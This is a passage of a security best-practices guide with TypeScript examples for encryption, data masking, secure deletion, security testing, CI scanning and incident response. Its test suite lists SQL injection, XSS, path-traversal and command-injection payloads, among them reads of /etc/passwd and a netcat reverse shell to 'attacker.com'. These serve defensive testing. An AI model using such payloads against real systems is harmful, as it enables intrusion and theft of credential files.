    } finally {
      clearTimeout(timeoutId);
    }
  }
  
  private async buildSecureHeaders(
    customHeaders?: HeadersInit
  ): Promise<Headers> {
    const headers = new Headers(customHeaders);
    
    // CSRF token
    const csrfToken = await this.getCSRFToken();
    headers.set('X-CSRF-Token', csrfToken);
    
    // Request ID for tracking
    headers.set('X-Request-ID', generateRequestId());
    
    // Client version
    headers.set('X-Client-Version', process.env.NEXT_PUBLIC_VERSION);
    
    return headers;
  }
  
  private validateResponse(response: Response): void {
    // Check content type
    const contentType = response.headers.get('content-type');
    if (!contentType?.includes('application/json')) {
      throw new SecurityError('Invalid content type');
    }
    
    // Validate security headers
    const requiredHeaders = [
      'X-Content-Type-Options',
      'X-Frame-Options',
      'Strict-Transport-Security'
    ];
    
    for (const header of requiredHeaders) {
      if (!response.headers.has(header)) {
        console.warn(`Missing security header: ${header}`);
      }
    }
  }
}
```

## Data Protection

### 1. Encryption at Rest

```typescript
export class DataEncryptionService {
  private algorithm = 'aes-256-gcm';
  private keyDerivationAlgorithm = 'pbkdf2';
  private keyDerivationIterations = 100000;
  
  // Field-level encryption for sensitive data
  async encryptField(
    plaintext: string,
    context: EncryptionContext
  ): Promise<EncryptedField> {
    // Derive key from master key and context
    const key = await this.deriveKey(context);
    
    // Generate IV
    const iv = randomBytes(16);
    
    // Encrypt
    const cipher = createCipheriv(this.algorithm, key, iv);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    // Get auth tag
    const authTag = cipher.getAuthTag();
    
    return {
      ciphertext: encrypted.toString('base64'),
      iv: iv.toString('base64'),
      authTag: authTag.toString('base64'),
      algorithm: this.algorithm,
      keyVersion: context.keyVersion
    };
  }
  
  // Transparent encryption for database
  createEncryptedColumn(columnName: string) {
    return {
      get: (value: string) => {
        if (!value) return null;
        const encrypted = JSON.parse(value);
        return this.decryptField(encrypted);
      },
      set: async (value: string) => {
        if (!value) return null;
        const encrypted = await this.encryptField(value, {
          table: 'users',
          column: columnName,
          keyVersion: 'v1'
        });
        return JSON.stringify(encrypted);
      }
    };
  }
}

// Usage in database schema
export const users = pgTable('users', {
  id: uuid('id').primaryKey(),
  email: text('email').notNull(),
  // Encrypted fields
  ssn: text('ssn', {
    mode: 'json',
    ...encryptionService.createEncryptedColumn('ssn')
  }),
  creditCard: text('credit_card', {
    mode: 'json',
    ...encryptionService.createEncryptedColumn('credit_card')
  })
});
```

### 2. Data Masking and Redaction

```typescript
export class DataMaskingService {
  // PII masking rules
  private maskingRules: MaskingRule[] = [
    {
      field: 'email',
      pattern: /^(.{2}).*(@.*)$/,
      replacement: '$1***$2'
    },
    {
      field: 'phone',
      pattern: /^(\d{3}).*(\d{4})$/,
      replacement: '$1-***-$2'
    },
    {
      field: 'ssn',
      pattern: /^\d{3}-?\d{2}-?(\d{4})$/,
      replacement: '***-**-$1'
    },
    {
      field: 'creditCard',
      pattern: /^(\d{4}).*(\d{4})$/,
      replacement: '$1 **** **** $2'
    }
  ];
  
  maskObject(data: any, userRole: string): any {
    // Clone to avoid mutation
    const masked = JSON.parse(JSON.stringify(data));
    
    // Apply masking based on role
    this.applyMasking(masked, userRole);
    
    return masked;
  }
  
  private applyMasking(obj: any, role: string, path: string = ''): void {
    for (const [key, value] of Object.entries(obj)) {
      const currentPath = path ? `${path}.${key}` : key;
      
      // Check if field should be masked for this role
      if (this.shouldMask(currentPath, role)) {
        const rule = this.getMaskingRule(key);
        if (rule && typeof value === 'string') {
          obj[key] = value.replace(rule.pattern, rule.replacement);
        } else {
          obj[key] = '[REDACTED]';
        }
      } else if (typeof value === 'object' && value !== null) {
        // Recursively mask nested objects
        this.applyMasking(value, role, currentPath);
      }
    }
  }
  
  private shouldMask(field: string, role: string): boolean {
    const maskingPolicy = {
      'viewer': ['ssn', 'creditCard', 'driverLicense'],
      'operator': ['creditCard'],
      'admin': []
    };
    
    return maskingPolicy[role]?.includes(field) ?? true;
  }
}
```

### 3. Secure Data Deletion

```typescript
export class SecureDataDeletionService {
  // Crypto-shredding for immediate data destruction
  async cryptoShred(recordId: string): Promise<void> {
    // 1. Delete encryption keys
    await this.keyVault.deleteKey(`record:${recordId}`);
    
    // 2. Mark record as shredded
    await db.update(records)
      .set({ 
        status: 'shredded',
        shredded_at: new Date(),
        data: null // Clear encrypted data
      })
      .where(eq(records.id, recordId));
    
    // 3. Queue for physical deletion
    await this.queueForDeletion(recordId);
  }
  
  // Secure overwrite for physical deletion
  async secureDelete(filePath: string): Promise<void> {
    const fd = await fs.open(filePath, 'r+');
    const stats = await fd.stat();
    const fileSize = stats.size;
    
    // DoD 5220.22-M (3 passes)
    const passes = [
      Buffer.alloc(fileSize, 0x00), // All zeros
      Buffer.alloc(fileSize, 0xFF), // All ones
      randomBytes(fileSize)          // Random data
    ];
    
    for (const pass of passes) {
      await fd.write(pass, 0, fileSize, 0);
      await fd.datasync();
    }
    
    await fd.close();
    await fs.unlink(filePath);
    
    // Verify deletion
    try {
      await fs.access(filePath);
      throw new Error('File still exists after deletion');
    } catch (error) {
      // File successfully deleted
    }
  }
  
  // GDPR-compliant data retention
  async enforceRetentionPolicy(): Promise<void> {
    const policies = [
      { type: 'logs', retention: 90 },
      { type: 'video', retention: 30 },
      { type: 'incidents', retention: 365 },
      { type: 'user_data', retention: 730 }
    ];
    
    for (const policy of policies) {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - policy.retention);
      
      const expired = await db.select()
        .from(records)
        .where(
          and(
            eq(records.type, policy.type),
            lt(records.created_at, cutoffDate)
          )
        );
      
      for (const record of expired) {
        await this.cryptoShred(record.id);
      }
    }
  }
}
```

## Security Testing

### 1. Security Test Suite

```typescript
// Security-focused test utilities
export const securityTests = {
  // SQL Injection tests
  sqlInjectionPayloads: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1'; UPDATE users SET role='admin' WHERE '1'='1",
    "1 UNION SELECT * FROM users",
    "1' AND SLEEP(5) --"
  ],
  
  // XSS payloads
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>'
  ],
  
  // Path traversal
  pathTraversalPayloads: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd'
  ],
  
  // Command injection
  commandInjectionPayloads: [
    '; ls -la',
    '| whoami',
    '`id`',
    '$(cat /etc/passwd)',
    '; nc -e /bin/sh attacker.com 4444'
  ]
};

// Security test implementation
describe('API Security Tests', () => {
  describe('Input Validation', () => {
    test.each(securityTests.sqlInjectionPayloads)(
      'should prevent SQL injection: %s',
      async (payload) => {
        const response = await request(app)
          .post('/api/users/search')
          .send({ query: payload });
        
        expect(response.status).toBe(400);
        expect(response.body.error).toContain('validation');
      }
    );
    
    test.each(securityTests.xssPayloads)(
      'should prevent XSS: %s',
      async (payload) => {
        const response = await request(app)
          .post('/api/comments')
          .send({ content: payload });
        
        // Should either reject or sanitize
        if (response.status === 201) {
          expect(response.body.content).not.toContain('<script>');
          expect(response.body.content).not.toContain('javascript:');
        } else {
          expect(response.status).toBe(400);
        }
      }
    );
  });
  
  describe('Authentication Security', () => {
    test('should enforce rate limiting on login', async () => {
      const attempts = Array.from({ length: 10 }, (_, i) => 
        request(app)
          .post('/auth/login')
          .send({ email: 'test@example.com', password: `wrong${i}` })
      );
      
      const responses = await Promise.all(attempts);
      const rateLimited = responses.filter(r => r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
    });
    
    test('should prevent timing attacks on login', async () => {
      const timings: number[] = [];
      
      for (let i = 0; i < 100; i++) {
        const start = process.hrtime.bigint();
        
        await request(app)
          .post('/auth/login')
          .send({ 
            email: i % 2 === 0 ? 'exists@example.com' : 'notexist@example.com',
            password: 'wrongpassword'
          });
        
        const end = process.hrtime.bigint();
        timings.push(Number(end - start) / 1e6); // Convert to ms
      }
      
      // Response times should be consistent
      const avgTime = timings.reduce((a, b) => a + b) / timings.length;
      const variance = timings.reduce((sum, time) => 
        sum + Math.pow(time - avgTime, 2), 0
      ) / timings.length;
      
      expect(Math.sqrt(variance)).toBeLessThan(50); // Low standard deviation
    });
  });
});
```

### 2. Penetration Testing Framework

```typescript
// Automated penetration testing
export class PenetrationTestRunner {
  async runSecurityTests(): Promise<TestResults> {
    const results: TestResults = {
      vulnerabilities: [],
      passed: [],
      failed: []
    };
    
    // 1. Authentication tests
    await this.testAuthentication(results);
    
    // 2. Authorization tests
    await this.testAuthorization(results);
    
    // 3. Input validation tests
    await this.testInputValidation(results);
    
    // 4. Session management tests
    await this.testSessionManagement(results);
    
    // 5. Cryptography tests
    await this.testCryptography(results);
    
    return results;
  }
  
  private async testAuthentication(results: TestResults): Promise<void> {
    const tests = [
      {
        name: 'Brute force protection',
        test: async () => {
          const attempts = 20;
          let blocked = false;
          
          for (let i = 0; i < attempts; i++) {
            const res = await this.attemptLogin('user@test.com', 'wrong');
            if (res.status === 429) {
              blocked = true;
              break;
            }
          }
          
          return blocked;
        }
      },
      {
        name: 'Password complexity enforcement',
        test: async () => {
          const weakPasswords = ['password', '12345678', 'qwerty'];
          const results = await Promise.all(
            weakPasswords.map(pwd => this.trySetPassword(pwd))
          );
          return results.every(r => r.rejected);
        }
      }
    ];
    
    for (const test of tests) {
      try {
        const passed = await test.test();
        if (passed) {
          results.passed.push(test.name);
        } else {
          results.failed.push(test.name);
          results.vulnerabilities.push({
            severity: 'HIGH',
            category: 'Authentication',
            description: `Failed: ${test.name}`
          });
        }
      } catch (error) {
        results.failed.push(test.name);
      }
    }
  }
}
```

### 3. Security Scanning Integration

```typescript
// CI/CD security scanning
export const securityPipeline = {
  // Static analysis
  staticAnalysis: {
    tools: ['eslint-plugin-security', 'semgrep', 'sonarqube'],
    config: {
      'eslint-plugin-security': {
        rules: {
          'detect-object-injection': 'error',
          'detect-non-literal-regexp': 'error',
          'detect-unsafe-regex': 'error',
          'detect-buffer-noassert': 'error',
          'detect-child-process': 'error',
          'detect-disable-mustache-escape': 'error',
          'detect-eval-with-expression': 'error',
          'detect-no-csrf-before-method-override': 'error',
          'detect-non-literal-fs-filename': 'error',
          'detect-non-literal-require': 'error',
          'detect-possible-timing-attacks': 'error'
        }
      }
    }
  },
  
  // Dependency scanning
  dependencyScanning: {
    tools: ['npm audit', 'snyk', 'owasp dependency-check'],
    failureThresholds: {
      'npm audit': 'high',
      'snyk': 'high',
      'owasp dependency-check': 7
    }
  },
  
  // Dynamic analysis
  dynamicAnalysis: {
    tools: ['zap', 'burp suite'],
    targets: ['staging', 'pre-production'],
    schedule: 'weekly'
  },
  
  // Container scanning
  containerScanning: {
    tools: ['trivy', 'clair', 'anchore'],
    policies: {
      'no-root-user': true,
      'no-privileged': true,
      'read-only-root-filesystem': true,
      'non-root-user-id': 1000
    }
  }
};

// GitHub Actions workflow
export const securityWorkflow = `
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: |
            - auto
            - security-audit
            - r/security-audit/javascript
      
      - name: Run npm audit
        run: npm audit --audit-level=high
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'HIGH,CRITICAL'
`;
```

## Incident Response

### 1. Security Incident Detection

```typescript
export class SecurityIncidentDetector {
  private detectionRules: DetectionRule[] = [
    {
      name: 'Multiple failed login attempts',
      condition: (events) => {
        const failedLogins = events.filter(e => 
          e.type === 'auth.login.failed'
        );
        return failedLogins.length > 5;
      },
      severity: 'HIGH',
      response: 'BLOCK_IP'
    },
    {
      name: 'Privilege escalation attempt',
      condition: (events) => {
        return events.some(e => 
          e.type === 'auth.privilege.change' &&
          e.data.newRole === 'admin' &&
          e.data.source !== 'admin_console'
        );
      },
      severity: 'CRITICAL',
      response: 'LOCK_ACCOUNT'
    },
    {
      name: 'Data exfiltration',
      condition: (events) => {
        const downloads = events.filter(e => 
          e.type === 'data.download'
        );
        const totalSize = downloads.reduce((sum, e) => 
          sum + e.data.size, 0
        );
        return totalSize > 1024 * 1024 * 1024; // 1GB
      },
      severity: 'CRITICAL',
      response: 'ALERT_SOC'
    }
  ];
  
  async analyzeEvents(timeWindow: number): Promise<Incident[]> {
    const events = await this.getRecentEvents(timeWindow);
    const incidents: Incident[] = [];
    
    for (const rule of this.detectionRules) {
      const eventGroups = this.groupEventsByEntity(events);
      
      for (const [entity, entityEvents] of eventGroups) {
        if (rule.condition(entityEvents)) {
          const incident = await this.createIncident({
            rule: rule.name,
            severity: rule.severity,
            entity,
            events: entityEvents,
            response: rule.response
          });
          
          incidents.push(incident);
          await this.executeResponse(incident);
        }
      }
    }
    
    return incidents;
  }
}
```

### 2. Incident Response Automation

```typescript
export class IncidentResponseAutomation {
  async handleIncident(incident: SecurityIncident): Promise<void> {
    // 1. Immediate containment
    await this.containThreat(incident);
    
    // 2. Preserve evidence
    await this.preserveEvidence(incident);
    
    // 3. Notify stakeholders
    await this.notifyStakeholders(incident);
    
    // 4. Begin investigation
    await this.initiateInvestigation(incident);
    
    // 5. Track metrics
    await this.updateMetrics(incident);
  }
  
  private async containThreat(incident: SecurityIncident): Promise<void> {
    switch (incident.type) {
      case 'account_compromise':
        await this.lockAccount(incident.affectedUser);
        await this.revokeAllSessions(incident.affectedUser);
        await this.forcePasswordReset(incident.affectedUser);
        break;
        
      case 'malware_detection':
        await this.isolateSystem(incident.affectedSystem);
        await this.blockNetworkAccess(incident.affectedSystem);
        await this.snapshotSystem(incident.affectedSystem);
        break;
        
      case 'data_breach':
        await this.revokeDataAccess(incident.affectedData);
        await this.enableEmergencyEncryption();
        await this.activateDataLossPrevention();
        break;
    }
  }
  
  private async preserveEvidence(incident: SecurityIncident): Promise<void> {
    const evidence = {
      timestamp: new Date().toISOString(),
      incidentId: incident.id,
      
      // System state
      systemSnapshot: await this.captureSystemState(),
      
      // Network data
      networkCapture: await this.captureNetworkTraffic(incident.timeframe),
      
      // Logs
      logs: await this.collectLogs({
        services: incident.affectedServices,
        timeframe: incident.timeframe
      }),
      
      // Memory dump (if applicable)
      memoryDump: incident.severity === 'CRITICAL' 
        ? await this.captureMemoryDump() 
        : null
    };
    
    // Store evidence securely
    await this.storeEvidence(evidence, {
      encryption: true,
      signing: true,
      chainOfCustody: true
    });
  }
}
```

### 3. Post-Incident Analysis

```typescript
export class PostIncidentAnalysis {
  async analyzeIncident(incidentId: string): Promise<IncidentReport> {
    const incident = await this.getIncident(incidentId);
    const evidence = await this.getEvidence(incidentId);
    
    const analysis = {
      // Timeline reconstruction
      timeline: await this.reconstructTimeline(evidence),
      
      // Root cause analysis
      rootCause: await this.identifyRootCause(evidence),
      
      // Impact assessment
      impact: await this.assessImpact(incident, evidence),
      
      // Lessons learned
      lessonsLearned: await this.extractLessons(incident, evidence),
      
      // Recommendations
      recommendations: await this.generateRecommendations(incident)
    };
    
    // Generate report
    return this.generateReport(incident, analysis);
  }
  
  private async generateRecommendations(
    incident: SecurityIncident
  ): Promise<Recommendation[]> {
    const recommendations: Recommendation[] = [];
    
    // Technical recommendations
    if (incident.exploitedVulnerability) {
      recommendations.push({
        priority: 'HIGH',
        category: 'Technical',
        action: 'Patch vulnerability',
        details: `Apply security patch for ${incident.exploitedVulnerability}`,
        timeline: '24 hours'
      });
    }
    
    // Process recommendations
    if (incident.type === 'social_engineering') {
      recommendations.push({
        priority: 'MEDIUM',
        category: 'Process',
        action: 'Update security awareness training',
        details: 'Include specific examples from this incident',
        timeline: '1 week'
      });
    }
    
    // Policy recommendations
    if (incident.policyGaps.length > 0) {
      recommendations.push({
        priority: 'HIGH',
        category: 'Policy',
        action: 'Update security policies',
        details: `Address gaps: ${incident.policyGaps.join(', ')}`,
        timeline: '2 weeks'
      });
    }
    
    return recommendations;
  }
}
```

## Security Monitoring and Metrics

### Key Security Metrics

```typescript
export const securityMetrics = {
  // Real-time metrics
  realtime: {
    activeThreats: 'SELECT COUNT(*) FROM threats WHERE status = "active"',
    failedLogins: 'SELECT COUNT(*) FROM auth_logs WHERE result = "failed" AND time > NOW() - INTERVAL 1 HOUR',
    suspiciousActivity: 'SELECT COUNT(*) FROM security_events WHERE risk_score > 0.8 AND time > NOW() - INTERVAL 1 HOUR'
  },
  
  // Daily metrics
  daily: {
    vulnerabilitiesFound: 'SELECT COUNT(*) FROM vulnerabilities WHERE discovered_date = CURRENT_DATE',
    patchCompliance: 'SELECT (COUNT(*) FILTER (WHERE patched = true) / COUNT(*)::float) * 100 FROM vulnerabilities',
    securityIncidents: 'SELECT COUNT(*) FROM incidents WHERE created_date = CURRENT_DATE'
  },
  
  // KPIs
  kpis: {
    meanTimeToDetect: 'AVG(detected_at - occurred_at) FROM incidents',
    meanTimeToRespond: 'AVG(responded_at - detected_at) FROM incidents',
    falsePositiveRate: '(COUNT(*) FILTER (WHERE false_positive = true) / COUNT(*)::float) * 100 FROM alerts'
  }
};

// Security dashboard
export class SecurityDashboard {
  async getMetrics(): Promise<DashboardMetrics> {
    return {
      threats: {
        active: await this.getActiveThreats(),
        blocked: await this.getBlockedThreats(),
        trending: await this.getTrendingThreats()
      },
      
      compliance: {
        overallScore: await this.getComplianceScore(),
        frameworks: {
          soc2: await this.getSOC2Compliance(),
          pciDss: await this.getPCIDSSCompliance(),
          iso27001: await this.getISO27001Compliance()
        }
      },
      
      vulnerabilities: {
        critical: await this.getCriticalVulnerabilities(),
        high: await this.getHighVulnerabilities(),
        patchingStatus: await this.getPatchingStatus()
      }
    };
  }
}
```

## Summary

This security best practices guide provides comprehensive guidelines for building and maintaining secure applications on the SPARC platform. Key takeaways:

1. **Defense in Depth**: Implement multiple layers of security controls
2. **Secure by Default**: Always choose the secure option
3. **Least Privilege**: Grant minimum necessary permissions
4. **Input Validation**: Never trust user input
5. **Encryption**: Protect data at rest and in transit
6. **Monitoring**: Continuous security monitoring and incident response
7. **Testing**: Regular security testing and vulnerability assessments
8. **Training**: Ongoing security awareness for all team members

Regular review and updates of these practices ensure they remain effective against evolving threats.